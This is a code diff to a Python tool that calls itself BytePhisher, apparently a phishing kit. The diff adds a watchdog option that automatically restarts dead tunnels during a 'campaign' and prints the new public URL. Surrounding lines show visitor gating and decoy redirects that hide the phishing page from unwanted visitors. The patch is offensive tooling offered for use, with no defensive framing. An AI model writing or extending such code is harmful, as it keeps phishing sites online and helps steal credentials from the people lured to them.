@@ -187,6 +187,9 @@ def main():
                     help="refuse an IP after N hits per hour (0 = unlimited)")
     ap.add_argument("--decoy", metavar="URL",
                     help="where gated-out visitors go (default: inert 503 page)")
+    ap.add_argument("--tunnel-restart", action="store_true",
+                    help="if a tunneler dies mid-campaign, bring it back automatically "
+                         "(max 5 restarts each) and print the new public URL")
     ap.add_argument("--version", action="version", version=f"BytePhisher {VERSION}")
     args = ap.parse_args()
 
@@ -382,12 +385,14 @@ def main():
 
     t0 = time.time()
     warned_dead = set()
+    restarts = {}
 
     def _tunnel_watchdog():
         """Warn loudly if a tunneler dies mid-campaign: the public URL it
-        produced is dead, and a silent dead link wastes a whole campaign."""
+        produced is dead, and a silent dead link wastes a whole campaign.
+        With --tunnel-restart, bring it back and print the new URL."""
         try:
-            from tunnels import dead_names
+            from tunnels import dead_names, run_one
             dead = set(dead_names())
         except Exception:
             return
@@ -395,8 +400,31 @@ def main():
         for name in sorted(new):
             warned_dead.add(name)
             print(f"\n[bytephisher] WARNING: tunneler '{name}' exited — "
-                  f"its public URL is dead. Restart it or use another tunnel "
-                  f"(e.g. -t all).\n", flush=True)
+                  f"its public URL is dead.", flush=True)
+            if not args.tunnel_restart:
+                print("[bytephisher] tip: --tunnel-restart brings it back automatically\n",
+                      flush=True)
+                continue
+            restarts[name] = restarts.get(name, 0) + 1
+            if restarts[name] > 5:
+                print(f"[bytephisher] '{name}' already restarted 5 times — giving up "
+                      f"on it (use -t all for fallbacks)\n", flush=True)
+                continue
+            print(f"[bytephisher] restarting '{name}' "
+                  f"(attempt {restarts[name]}/5) ...", flush=True)
+            try:
+                new_url = run_one(name, port)
+            except Exception as e:
+                new_url = None
+                print(f"[bytephisher] restart raised {type(e).__name__}: {e}", flush=True)
+            if new_url:
+                urls[name] = new_url
+                # allow the watchdog to notice if the NEW tunnel dies later
+                warned_dead.discard(name)
+                print(f"[bytephisher] '{name}' is back: {new_url}\n", flush=True)
+            else:
+                print(f"[bytephisher] '{name}' did not come back — "
+                      f"use another tunnel (e.g. -t all)\n", flush=True)
 
     try:
         if args.no_tui or not sys.stdout.isatty():
